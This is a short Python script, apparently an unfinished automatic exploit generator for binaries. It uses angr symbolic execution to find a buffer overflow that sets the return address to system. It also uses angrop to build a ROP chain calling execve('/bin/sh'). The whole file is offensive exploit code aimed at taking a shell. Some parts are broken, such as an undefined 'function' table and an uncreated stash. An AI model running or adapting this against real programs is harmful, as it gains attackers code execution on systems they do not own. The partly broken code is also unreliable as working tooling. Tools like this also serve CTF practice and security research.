from pwn import *
import angr, angrop
import claripy

# [+] check for mitigations in binary and then divide 
# RIP overwrite if system or win exist in the code
# ROPchain to call execve
# shellcode to direct to

name = sys.argv[1]
proj = angr.Project(name,auto_load_libs=False)
state = proj.factory.entry_state(stdin=angr.SimFile)
simgr = proj.factory.simulation_manager(state,save_unconstrained=True)

def find_rop():
	flag = 0
	try:
		rop = proj.analyses.ROP()
		rop.find_gadgets()
		chain = rop.set_regs(rax=0x3b,rdi="/bin/sh\x00",rdx=0,rsi=0)
		print(chain.print_payload_code())
	except angrop.errors.RopException:
		log.info("Could not construct ROPchain")
		flag = 1
	if(flag == 0):
		return chain
	else:
		return ""

# [+] snippet from finder.py --> for finding a way to overwrite RIP
def find_bof(simgr):
	global crashing_input
	# working of simgr and stashes: https://github.com/angr/angr-doc/blob/master/docs/pathgroups.md
	if len(simgr.unconstrained):
	# finding unconstrained path to overwrite the return address with "CCCC"*2
		for path in simgr.unconstrained:
			#if path.satisfiable(extra_constraints=[path.regs.pc == b"CCCC"*2]): 
			path.add_constraints(path.regs.pc == p64(function['system']))
			if path.satisfiable():
				# input_data = state.posix.stdin.load(0, state.posix.stdin.size) <-- to create a bitvector of the input size
				simgr.stashes['bof'].append(path)
				unconstrained_state = path
				crashing_input = unconstrained_state.posix.dumps(0)
				print(len(crashing_input))
			simgr.stashes['unconstrained'].remove(path)
			simgr.drop(stash='active')
	return simgr	
	

find_rop()